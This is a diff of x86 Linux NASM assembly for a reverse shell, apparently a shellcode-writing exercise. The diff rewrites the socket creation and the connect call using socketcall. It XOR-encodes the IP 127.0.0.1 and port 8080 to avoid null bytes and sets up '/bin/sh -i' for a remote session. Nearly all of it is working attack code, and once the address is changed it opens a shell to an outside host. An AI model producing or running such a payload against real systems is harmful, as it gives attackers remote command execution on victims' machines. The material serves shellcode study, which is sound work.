@@ -1,18 +1,8 @@
-; compile : nasm -f elf32 reverser.asm && ld -m elf_i386 reverser.o -o reverseshell
+; compile : nasm -f elf32 reverser_v0.asm && ld -m elf_i386 reverser_v0.o -o reverseshell
 section .text
     global      _start
 
 section .data
-    IP_ADDRESS  equ     0xfeffff80
-    PORT        equ     0x901F
-    AF_INET     equ     0x2
-    SOCK_STREAM equ     0x1
-
-    SOCKET      equ     0x167
-    CONNECT     equ     0x16a
-    DUP         equ     0x3f
-    EXECVE      equ     0xb
-
     arg0        db      "/bin/sh", 0
     arg1        db      "-i", 0
     env0        db      "PS1=\n[\t] \u@\h \w\n\\$ : ", 0
@@ -22,29 +12,38 @@ section .data
 _start:
 ; We first need to create a socket
 ; In C it would be like int host_sock = socket(AF_INET, SOCK_STREAM, protocol);
-    mov         ax, SOCKET      ; socketcall (102)
-    mov         bl, AF_INET     ;
-    mov         cl, SOCK_STREAM
-    mov         dl, 0x6
+    push        0x66
+    pop         ax              ; socketcall (102)
+    push        0x1
+    pop         ebx             ; SYS_SOCKET (1)
+
+    xor         ecx, ecx
+    push        ecx             ; protocol (0)
+    push        ebx              ; SOCK_STREAM (1)
+    push        0x2             ; AF_INET (2)
+
+    mov         ecx, esp
     int         80h             ; execute
+    mov         edi, eax
+    mov         esi, 3
 
 ; Then connect to ip and port
-    xchg        edi, eax
-    xor         ecx, ecx
-    mul         ecx
-    push        ecx
-    push        ecx
-    mov         ecx, IP_ADDRESS ; ip_address = 127.0.0.1 = 7F000001: need to put it in reverse : 0100007f xored with ffffffff : feffff80
+    mov         al, 0x66       ; socketcall (102)
+    pop         ebx
+    mov         ecx, 0xfeffff80 ; ip_address = 127.0.0.1 = 7F000001: need to put it in reverse : 0100007f xored with ffffffff : feffff80
     xor         ecx, 0xffffffff ; xoring ip address twice to avoid storing nullbyte
     push        ecx
-    push        word PORT       ; port = 8080 = 1F90; need to put it in reverse
-    push        word AF_INET    ; AF_INET (2)
+    push        word 0x901F     ; port = 8080 = 1F90; need to put it in reverse
+    xor         ecx, ecx
+
+    push        bx              ; AF_INET (2)
     mov         ecx, esp
     push        0x10
-    pop         edx
+    push        ecx
 
-    mov         ebx, edi
-    mov         ax, CONNECT
+    push        edi
+    mov         ecx, esp
+    inc         ebx             ; SYS_CONNECT (3)
     int         80h             ; execute
 
 ; Get input and redirect output
